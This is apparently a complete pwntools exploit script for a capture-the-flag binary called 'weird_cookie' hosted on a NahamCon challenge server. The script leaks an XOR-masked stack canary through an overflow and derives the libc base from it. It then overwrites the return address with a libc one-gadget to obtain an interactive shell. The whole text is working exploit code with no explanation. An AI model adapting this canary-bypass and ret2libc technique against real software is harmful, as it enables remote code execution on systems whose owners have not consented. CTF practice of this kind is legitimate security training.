from pwn import *

context.binary = exe = ELF('./weird_cookie')
libc = ELF('./libc-2.27.so')

io = remote('challenge.nahamcon.com', 30961)

io.recvuntil(b'me?\n')
payload = b'i'*39
io.sendline(payload)
io.recvline()
canary = u64(io.recv(8).ljust(8, b'\0'))
printf = canary ^ 0x123456789ABCDEF1
libc.address = printf - libc.sym['printf']
log.info(f'Canary: {hex(canary)}\nLibc base: {hex(libc.address)}')

one = 0x4f2a5
io.recvuntil(b'again.\n')
payload = b'i'*40 + p64(canary) + p64(0) + p64(libc.address + one)
io.sendline(payload)
io.interactive()